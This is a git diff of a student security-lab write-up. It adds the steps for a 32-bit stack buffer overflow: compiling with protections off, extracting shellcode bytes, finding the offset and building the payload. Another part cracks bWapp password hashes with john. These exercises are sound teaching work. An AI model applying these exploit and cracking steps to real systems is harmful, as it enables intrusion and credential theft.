@@ -1,3 +1,4 @@
+# TEST
 # Task 1: Software buffer overflow attack
  
 Given a vulnerable C program 
@@ -26,7 +27,6 @@ unsigned char code[] = \
 "\xe3\x66\x68\xff\x01\x66\x59\xb0"
 "\x0f\xcd\x80";
 
-int
 void main() {
     int (*ret)() = (int(*)())code;
 }
@@ -36,18 +36,53 @@ void main() {
 - Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
   You are free to choose Code Injection or Environment Variable approach to do. 
 - Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
-**Answer 1**: Must conform to below structure:
 
-Description text (optional)
+**Answer 1**:
 
+- We first create a vuln.c and shellcode.c file and fill the content with the given C program
 
-``` 
-    code block (optional)
+```
+    nano vuln.c
+    nano shellcode.c
+
+    # compile
+    gcc -m32 vuln.c -o vuln -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
+    gcc -m32 shellcode.c -o shellcode -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
 ```
 
-output screenshot (optional)
+- Applying the Code Injection method, the flow will following the steps:
+    + Retrieve bytes code from our malicious program
+    + Determine the buffer offset
+    + Determine the location for shellcode
+    + Craft the payload
+    + Proceed the exploitation
 
-**Conclusion**: comment text about the screenshot or simply answered text for the question
+- We'll proceed using objdump to get the bytes code from our compiled shellcode
+
+```
+    objdump -d ./shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+```
+
+- Next we use pattern to determine the offset
+```
+    pattern create 200 pattern.txt
+```
+- Run the program with the pattern.txt as input to oerflow the buffer
+```
+    r $(python -c "print(open('pattern.txt', 'r').read())")
+```
+
+![image](images/image7.png)
+
+- Program crashed at 0x41412d41, use pattern offset to see the offset
+```
+    pattern offset 0x41412d41
+```
+
+![image](images/image8.png)
+
+- Offset at 20 which means we'd need 20 bytes to reach EBP
+- payload = padding + return_address + nop_sled + shellcode
 
 # Task 2: Attack on the database of bWapp 
 - Install bWapp (refer to quang-ute/Security-labs/Web-security). 
@@ -106,7 +141,7 @@ To identity the hash algorithm, we'll use hashid, a library in python.
 ![image](images/image3.png)
 
 Hashid suggest that the encrypt can be crack by using john specifically the format raw-sha1
-https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU
+
 ```
     john --format=Raw-SHA1 hash_pw.txt
 ```
